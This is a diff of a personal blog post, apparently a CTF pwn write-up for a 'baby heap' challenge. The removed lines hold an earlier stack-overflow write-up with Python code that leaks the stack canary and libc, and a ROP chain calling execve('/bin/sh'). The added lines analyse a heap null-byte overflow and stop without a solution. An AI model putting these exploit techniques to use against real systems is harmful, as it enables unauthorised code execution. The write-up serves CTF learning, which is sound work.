@@ -1,6 +1,6 @@
 +++
-date = '2026-01-05'
-draft = false
+date = '2026-02-05'
+draft = true
 title = 'CyberEdu baby heap Writeup'
 ShowToc = true
 tags = ["CyberEdu", "pwn", "buffer-overflow", "Format-String"]
@@ -11,141 +11,78 @@ tags = ["CyberEdu", "pwn", "buffer-overflow", "Format-String"]
 
 In **[this challenge](https://app.cyber-edu.co/challenges/559febf0-7f21-11ea-be53-e5754acd68a0?tenant=cyberedu)** you can test your understanding about basic heap exploitation.
 
-Just as a side note, I've put off doing heap challenges for the longest time ever, because I thought they were too bothersome, but that changes today, because we're solving this! So this is a great and notable milestone.
+Just as a side note, I've put off doing heap challenges for the longest time ever, because I thought they were too bothersome, but that changes today, because we're solving this! So this is a great and notable milestone. ~After I wrote this, I didn't open my laptop for two days~.
+
+And a quick warning, this is going to be a little more in-depth than usual, because as I said, this is a new concept for me.
 
 ![challenge-screenshot](pic1.png#center)
 
-We also have canary and NX enabled. 
+We also have a 64 bit fie with canary, NX, PIE and full RelRo enabled.
 
----
+And of course, the *menu*. Every time there's a weird menu, 99%, that's heap.
 
-Let's look at the functions here. First we have a `main` which forks every time it's ran:
+I attempted to overflow the size, but I got `Option: Size: The maximum size was exceeded.` a million times in a row, completely impairing our input:
 
 ![challenge-screenshot](pic2.png#center)
 
-Then, this function is looped:
+I quickly attempted a double free, but it didn't work either.
 
-![challenge-screenshot](pic4.png#center)
+---
 
-It calls some weird functions on the string:
+Let's look at the functions here. I won't include the `main`, since it just redirects to these functions. First, `free`:
 
-![challenge-screenshot](pic3.png#center)
+![challenge-screenshot](free.png#center)
 
-This just zeros the first 7 bytes of the string, before it's read. Interesting.
+Then, `show`:
 
-![challenge-screenshot](pic5.png#center)
+![challenge-screenshot](show.png#center)
 
-This however, is our buffer overflow. Just keeps reading and writing into `a1` aka `s1` until a newline!
+And finally, `malloc`, which is longer and more interesting.
+
+![challenge-screenshot](malloc1.png#center)
+
+This first part just means we can only allocate up to 5 buffers.
+
+![challenge-screenshot](malloc2.png#center)
+
+We can write up to 511 bytes into our buffer, which get `strcpy`d into `*((_QWORD *)&unk_202040 + v3)` aka `malloc(nbytes)`. This however, copies *everything*, including the null byte terminator of our buf. 
 
 ---
 
 ## Identifying the vulnerabilities
 
-So how can we leak the canary, for the buffer overflow? Since we have a `puts(s1)` not a `printf(s1)`, we don't have any format string vulnerabilities, because `puts` doesn't interpret things that way. 
 
-But what it *does* do, is just keep printing whatever until the next null byte, because that's how strings work, right? And let's take a look at the stack layout again:
+This means we can overwrite the next chunk's *metadata* with a null byte. The metadata we're specifically interested in is the `prev_inuse` and the `size` flags. I played around with chunks and got to this conclusion: 
 
-`char s1[1032]; // [rsp+0h] [rbp-410h] BYREF`
-`unsigned __int64 v2; // [rsp+408h] [rbp-8h]`
+If we: 
+- `malloc(a)` of size `0x88`,
+- then `malloc(b)` of size `0x88`, 
+- then `free(a)` and reallocate a with another `malloc(a)` of `0x88`
 
-So, if we fill the entire `s1` with some garbage, it will keep printing until the `x00` ending of the canary. We see that `0x00` at the end, but in actual endian-ness, its at the beginning. So we need to overwrite it, to actually get anything out of it, otherwise it will consider it a null terminator. So this:
+We essentially overwrite `b`'s metadata! 
 
-```python
-p.recvuntil(b')\n')
-p.sendline(b"a"*1033)
+I took a screenshot before we free and reallocate the `a` chunk, and one after:
 
-p.recvn(1033)
+![challenge-screenshot](chunkab.png#center)
 
-data = p.recvn(7)
-canary = u64(data.rjust(8, b"\x00"))
+Metadata (size `0x90` and flag `0x1` of `prev_inuse`) intact
 
-print(hex(canary))
-```
+![challenge-screenshot](chunkab2.png#center)
 
-Gives us the canary! To find out libc, we can essentially do the same thing, but cover up everything until libc. The canary doesn't change between rounds, so that's really nice! I'm thinking, if we just keep printing values, we're going to get to `libc` eventually, right? And we did! 
+And now, it's gone! But we don't want all that to be gone, because it's just more trouble if we completely overwrite the size. So instead, we're just going to want to overwrite the `prev_inuse`. So we need the sizes to be at least three digits long, > 256. So how much should we allocate for that? We want to keep the size the same after modifying, and since we can overwrite only two bytes, not just one, we need the metadata to look like `101`. That way, after the overwrite, it's going to be `100`.
 
-```python
-p.recvuntil(b')\n')
-#1032 bytes s1, 8 canary, 8 rbp
-#next 8 bytes, rip
-#keep adding +8 til libc address
-p.sendline(b"a"*(1032+8+8 +8+8))
-p.recvn(1032+8+8+8+8)
+![challenge-screenshot](morechunk.png#center)
 
-data3 = p.recvn(6)
-leaklibc = u64(data3.ljust(8, b"\x00"))
-```
+Here it is, after using size `248`. After freeing `b`:
 
----
+![challenge-screenshot](freed.png#center)
 
-## The exploit
+The big idea would be overwriting `printf.got` with `system`, so that when we choose the `show` option, if the overwrite is successful, calling `printf("/bin/sh")`, aka malloc-ing something with the content `"/bin/sh"` would pop a shell. But if you recall, we're working with *full RelRO*. That means GOT overwrites aren't happening anytime soon. No libc either, so no one_gadget.
 
-I tried a local `system(/bin/sh)`, everything *seemed* good but because of the stupid `fork()` our shell was exiting immediately. So, let's try that with `execve` then, since `fork` is an `execve` thing itself, and we might be able to replace it.
+So instead, we're going to be using `__free_hook`!
 
-![challenge-screenshot](pic7.png#center)
+At this point, I really had no clue of what to do next so I started looking online for solutions. And when I tell you I found **nothing**. Not even Claude or GPT knew how to solve this. But I really want to. I struggled two more hours with it I'm seriously done. Maybe I'll do this another time.
 
-I changed it to this
-
-```python
-#gadgeetsuh
-pop_rdi_ret = 0x04009b3
-ret = 0x4005f1
-pop_rsi_r15_ret = 0x4009b1
-
-#local
-libc = leaklibc - 0x29f68
-system = libc + 0x53918
-execve = libc + 0xde550
-binsh = libc + 0x1a7e3c
-
-p.recvuntil(b')\n')
-
-payload = (b"a"*1032 +
-           p64(canary) +
-           b"r"*8 +
-           p64(pop_rdi_ret) +
-           p64(binsh) +
-           p64(pop_rsi_r15_ret) +
-           p64(0x0) +
-           p64(0x0) +
-           p64(ret) +
-           p64(execve)
-           )
-```
-
-And we get the local flag!
-
-![challenge-screenshot](pic8.png#center)
-
-Now, let's connect remotely and see what we can do. The offset from the value to `libc` will most probably be different. Most likely, `2.23` or `2.27`.
-
-![challenge-screenshot](pic9.png#center)
-
-So it is - looks like a non-ASLR version of `libc`. But to get the offsets to `binsh` and `execve` we need to know the version. Also, we need to guess the offset of the leak.
-
-Locally, this is how non-ASLR libc gets mapped:
-
-![challenge-screenshot](pic10.png#center)
-
-So I asked Claude to add a brute force to those 3 bytes. I assumed the version was `2.23`, same as [ropper](https://irinasusca.github.io/writeup-blog/posts/ropper-writeup/), which were sister and brother on the ECSC 2019 Final Phase. It *didn't* work, but it should've worked. It was Claude's fault.
-
-I bruteforced the bytes, for both a 2.27 and a 2.23 version, but to no avail. Then, I thought, `0x7ffff7a2d830` is most likely either `libc_start_main` or `libc_start_main + ret` (if we're lucky. Sometimes it's nothing, just a completely random offset). 
-
-Using blukat, it's exactly those versions that I tested with the bruteforce, which didn't work! Interesting.
-
-![challenge-screenshot](libc.png#center)
-
-Anyways, I replaced the offsets:
-
-```python
-libc = leaklibc - 0x020830
-execve = libc + 0xcc770
-binsh = libc + 0x18cd57
-```
-
-And we get the flag!
-
-![challenge-screenshot](flag.png#center)
 
 ---
 
